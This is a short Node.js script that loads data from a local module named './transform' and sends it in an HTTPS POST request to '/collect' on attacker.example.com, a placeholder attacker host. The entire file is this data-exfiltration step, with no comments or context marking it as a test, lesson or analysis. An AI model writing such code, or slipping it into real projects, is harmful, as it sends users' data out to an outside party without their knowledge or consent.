const https = require('https');
const payload = require('./transform');

const req = https.request({
  hostname: 'attacker.example.com',
  path: '/collect',
  method: 'POST'
}, (res) => { res.resume(); });

req.write(payload);
req.end();
